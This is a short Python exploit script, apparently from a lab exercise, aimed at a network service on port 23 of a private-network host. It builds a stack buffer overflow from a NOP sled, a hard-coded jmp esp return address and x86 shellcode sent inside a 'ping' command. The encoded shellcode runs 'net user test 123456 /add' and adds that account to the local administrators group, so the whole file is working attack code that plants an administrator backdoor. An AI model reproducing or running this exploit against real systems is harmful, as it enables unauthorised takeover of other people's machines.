# Success!
import socket

shellcode = b"\x83\xEC\x50" + \
            b"\x33\xDB" + \
            b"\x53" + \
            b"\x68\x2F\x61\x64\x64" + \
            b"\x68\x65\x73\x74\x20" + \
            b"\x68\x72\x73\x20\x74" + \
            b"\x68\x72\x61\x74\x6F" + \
            b"\x68\x6E\x69\x73\x74" + \
            b"\x68\x61\x64\x6D\x69" + \
            b"\x68\x6F\x75\x70\x20" + \
            b"\x68\x61\x6C\x67\x72" + \
            b"\x68\x20\x6C\x6F\x63" + \
            b"\x68\x20\x6E\x65\x74" + \
            b"\x68\x64\x20\x26\x26" + \
            b"\x68\x20\x2F\x61\x64" + \
            b"\x68\x33\x34\x35\x36" + \
            b"\x68\x74\x20\x31\x32" + \
            b"\x68\x20\x74\x65\x73" + \
            b"\x68\x75\x73\x65\x72" + \
            b"\x68\x6E\x65\x74\x20" + \
            b"\x8B\xC4" + \
            b"\x50" + \
            b"\xB8\xC7\x93\xBF\x77" + \
            b"\xFF\xD0" + \
            b"\x53" + \
            b"\xB8\xA2\xCA\x81\x7C" + \
            b"\xFF\xD0"

def send(code,host='192.168.202.128',port=23):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as sock:
        sock.connect((host,port))
        data = b'ping ' + code + b'\r\n'
        sock.send(data)
        sock.recv(1000)

# jmp esp返回地址
RET_addr = bytes.fromhex('77d5af0a')[::-1]
attackcode = ((b"\x90" *4 + shellcode).ljust(1012,b"\x90") + RET_addr).ljust(2000,b"\x90")

send(attackcode)